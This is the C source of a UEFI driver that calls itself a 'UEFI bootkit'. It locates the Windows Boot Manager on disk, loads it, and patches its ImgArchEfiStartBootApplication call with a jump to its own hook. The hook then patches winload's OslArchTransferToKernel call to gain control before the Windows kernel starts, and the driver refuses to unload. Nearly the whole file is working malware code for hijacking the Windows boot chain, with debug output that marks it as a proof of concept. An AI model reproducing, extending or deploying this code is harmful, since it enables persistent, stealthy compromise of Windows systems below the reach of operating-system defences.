#include "drv.h"

//
// Libraries
//
#include <Library/DevicePathLib.h>
#include <Library/BaseMemoryLib.h>

//
// Protocols
//
#include <Protocol/SimpleFileSystem.h>

//
// Our includes
//
#include "utils.h"
#include "pe.h"
#include "imageldr.h"
#include "hook.h"

//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "UefiDriver";

// Title
static CHAR16 *gTitle = L"-= Dude719s UEFI bootkit Runtime Dirver =-\r\n";
static CHAR16 *gWindowsBootX64ImagePath = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
static EFI_HANDLE gWindowsImagehandle;


//VOID EFIAPI hkOslArchTransferToKernel( VOID* KernelParams, VOID* KiSystemStartup )
//{
//	// Clear the screen
//	//gST->ConOut->ClearScreen( gST->ConOut );
//	//Print( L"KiSystemStartup = %lx\r\n", KiSystemStartup );
//	//UtilWaitForKey( );
//
//	OslArchTransferToKernelHook( KernelParams, KernelParams );
//
//	//oOslArchTransferToKernel( KernelParams, KiSystemStartup );
//}

//
// Our ImgArchEfiStartBootApplication hook which takes the winload Image Base as a parameter so we can patch the kernel
//
EFI_STATUS EFIAPI hkImgArchEfiStartBootApplication( VOID* Parameters, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, UINT64* SomeReturnValue )
{
	PIMAGE_NT_HEADERS NtHdr = NULL;

	// Clear the screen
	gST->ConOut->ClearScreen( gST->ConOut );

	Print( L"Inside ImgArchEfiStartBootApplication\r\n" );

	Print( L"ImageBase = %lx\r\n", ImageBase );
	Print( L"ImageSize = %lx\r\n", ImageSize );

	NtHdr = ImageNtHeader( ImageBase );
	if (NtHdr != NULL)
	{
		EFI_STATUS EfiStatus = EFI_SUCCESS;
		UINT8* Found = NULL;

		VOID* ArchpChildAppEntryRoutine = (VOID*)((UINT8*)ImageBase + HEADER_VAL_T( NtHdr, AddressOfEntryPoint ));
		Print( L"ArchpChildAppEntryRoutine = %lx\r\n", ArchpChildAppEntryRoutine );		

		// Find right location to patch
		EfiStatus = UtilFindPattern( sigOslArchTransferToKernel, 0xCC, sizeof( sigOslArchTransferToKernel ), ImageBase, (UINT32)ImageSize, (VOID**)&Found );
		if (!EFI_ERROR( EfiStatus ))
		{
			Print( L"Found OslArchTransferToKernel call at %lx\r\n", Found );

			//Print( L"hkOslArchTransferToKernel at %lx\r\n", hkOslArchTransferToKernel );
			//UtilDisassembleCode( (UINT8*)hkOslArchTransferToKernel, (UINTN)hkOslArchTransferToKernel, 20 );
			oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress( Found );
			Print( L"Original OslArchTransferToKernel at %lx\r\n", oOslArchTransferToKernel );
			Print( L"OslArchTransferToKernelHook at %lx\r\n", &OslArchTransferToKernelHook );

			// Backup original function bytes before patching
			OslArchTransferToKernelPatchLocation = (VOID*)Found;
			CopyMem( (VOID*)OslArchTransferToKernelBackup, (VOID*)Found, 5 );
			//Print( L"Backup:\r\n" );
			//UtilDisassembleCode( (UINT8*)Found, (UINTN)Found, 5 );

			// Do patching 
			*(UINT8*)Found = 0xE8;
			*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset( (VOID*)Found, (VOID*)&OslArchTransferToKernelHook ); //(UINT32)(((UINTN)&OslArchTransferToKernelHook) - ((UINTN)Found + 1 + sizeof( UINT32 )));

			// Display patched code 
			//Print( L"Patched:\r\n" );
			//UtilDisassembleCode( (UINT8*)Found, (UINTN)Found, 5 );

			Print( L"OslArchTransferToKernelHook:\r\n" );
			UtilDisassembleCode( (UINT8*)&OslArchTransferToKernelHook, (VOID*)&OslArchTransferToKernelHook, 20 );
		}
		else
		{
			Print( L"\r\nImgArchEfiStartBootApplication error, failed to find SetOslEntryPoint patch location. Status: %lx\r\n", EfiStatus );
		}
	}

	// Restore original bytes to call
	CopyMem( ImgArchEfiStartBootApplicationPatchLocation, ImgArchEfiStartBootApplicationBackup, 5 );
	//Print( L"ImgArchEfiStartBootApplication original = %lx\r\n", oImgArchEfiStartBootApplication );
	//UtilDisassembleCode( (UINT8*)ImgArchEfiStartBootApplicationPatchLocation, (UINTN)ImgArchEfiStartBootApplicationPatchLocation, 8 );

	Print( L"Press any key to continue..." );
	UtilWaitForKey( );

	// Clear screen
	gST->ConOut->ClearScreen( gST->ConOut );

	return oImgArchEfiStartBootApplication( Parameters, ImageBase, ImageSize, BootOption, SomeReturnValue );
}

//
// Patch the Windows Boot Manager (bootmgfw.efi)
// 
EFI_STATUS PatchWindowsBootManager( IN VOID* LocalImageBase, IN EFI_HANDLE BootMgrHandle )
{
	EFI_STATUS EfiStatus = EFI_SUCCESS;
	EFI_LOADED_IMAGE *BootMgrImage = NULL;
	UINT8* Found = NULL;

	// Get Windows Boot Manager memory mapping data
	EfiStatus = gBS->HandleProtocol( BootMgrHandle, &gEfiLoadedImageProtocolGuid, (void **)&BootMgrImage );
	if (EFI_ERROR( EfiStatus ))
	{
		ErrorPrint( L"\r\nPatchWindowsBootManager error, failed to get Loaded Image info. Status: %lx\r\n", EfiStatus );
		return EfiStatus;
	}

	// Print Windows Boot Manager image info
	UtilPrintLoadedImageInfo( BootMgrImage );

	// Find right location to patch
	EfiStatus = UtilFindPattern( 
		sigImgArchEfiStartBootApplicationCall,
		0xCC, 
		sizeof( sigImgArchEfiStartBootApplicationCall ),
		BootMgrImage->ImageBase, 
		(UINT32)BootMgrImage->ImageSize, 
		(VOID**)&Found
	);
	if (!EFI_ERROR( EfiStatus ))
	{
		// Found address, now let's do our patching
		UINT32 NewCallRelative = 0;

		Print( L"Found ImgArchEfiStartBootApplication call at %lx\n", Found );

		// Save original call
		oImgArchEfiStartBootApplication = (tImgArchEfiStartBootApplication)UtilCallAddress( Found );
		// Backup original bytes and patch location before patching
		ImgArchEfiStartBootApplicationPatchLocation = (VOID*)Found;
		CopyMem( ImgArchEfiStartBootApplicationBackup, ImgArchEfiStartBootApplicationPatchLocation, 5 );
		// Patch call to jump to our hkImgArchEfiStartBootApplication hook
		NewCallRelative = UtilCalcRelativeCallOffset( (VOID*)Found, (VOID*)&hkImgArchEfiStartBootApplication );
		//Found
		*(UINT8*)Found = 0xE8; // Write call opcode
		*(UINT32*)(Found + 1) = NewCallRelative; // Write the new relative call offset
	}
	else
	{
		ErrorPrint( L"\r\nPatchWindowsBootManager error, failed to find Archpx64TransferTo64BitApplicationAsm patch location. Status: %lx\r\n", EfiStatus );
	}

	return EfiStatus;
}

// 
// Try to find gWindowsBootX64ImagePath by browsing each device
// 
EFI_STATUS LocateWindowsBootManager( EFI_DEVICE_PATH** LoaderDevicePath )
{
	EFI_FILE_IO_INTERFACE *ioDevice;
	EFI_FILE_HANDLE handleRoots, bootFile;
	EFI_HANDLE* handleArray;
	UINTN nbHandles, i;
	EFI_STATUS efistatus;

	*LoaderDevicePath = (EFI_DEVICE_PATH *)NULL;
	efistatus = gBS->LocateHandleBuffer( ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &nbHandles, &handleArray );
	if (EFI_ERROR( efistatus ))
		return efistatus;

	Print( L"\r\nNumber of UEFI Filesystem Devices: %d\r\n", nbHandles );

	for (i = 0; i < nbHandles; i++)
	{
		efistatus = gBS->HandleProtocol( handleArray[i], &gEfiSimpleFileSystemProtocolGuid, &ioDevice );
		if (efistatus != EFI_SUCCESS)
			continue;

		efistatus = ioDevice->OpenVolume( ioDevice, &handleRoots );
		if (EFI_ERROR( efistatus ))
			continue;

		efistatus = handleRoots->Open( handleRoots, &bootFile, gWindowsBootX64ImagePath, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY );
		if (!EFI_ERROR( efistatus ))
		{
			handleRoots->Close( bootFile );
			*LoaderDevicePath = FileDevicePath( handleArray[i], gWindowsBootX64ImagePath );
			Print( L"\r\nFound Windows x64 bootmgfw.efi file at \'%s\'\r\n", ConvertDevicePathToText( *LoaderDevicePath, TRUE, TRUE ) );
			break;
		}
	}

	return efistatus;
}

// 
// Main entry point
// 
EFI_STATUS EFIAPI UefiMain( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable )
{
	EFI_STATUS efiStatus;
	EFI_LOADED_IMAGE* Image;
	EFI_DEVICE_PATH* WinBootMgrDevicePath;

	// Clear screen
	gST->ConOut->ClearScreen( gST->ConOut );

	//
	// Install required driver binding components
	//
	efiStatus = EfiLibInstallDriverBindingComponentName2( ImageHandle, SystemTable, &gDriverBindingProtocol, ImageHandle, &gComponentNameProtocol, &gComponentName2Protocol );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	Print( gTitle );
	Print( L"\r\nRuntime Driver handle is %lx and System Table is at %p\r\n", ImageHandle, SystemTable );

	efiStatus = gBS->HandleProtocol( ImageHandle, &gEfiLoadedImageProtocolGuid, &Image );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	UtilPrintLoadedImageInfo( Image );

	Print( L"\r\nLocating Windows UEFI Boot Manager...\r\n" );
	efiStatus = LocateWindowsBootManager( &WinBootMgrDevicePath );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	efiStatus = ImageLoad( ImageHandle, WinBootMgrDevicePath, &gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	Print( L"\r\nPatching Windows Boot Manager...\r\n" );

	efiStatus = PatchWindowsBootManager( Image->ImageBase, gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	Print( L"\r\nSuccessfully patched Windows Boot Manager!\r\n" );

	//Print( L"\r\nPress any key to load Windows...\r\n" );
	//UtilWaitForKey( );

	efiStatus = ImageStart( gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

Exit:
	return efiStatus;
}


// 
// Unload the driver
// 
EFI_STATUS EFIAPI UefiUnload( IN EFI_HANDLE ImageHandle )
{
	// Disable unloading
	return EFI_ACCESS_DENIED;
}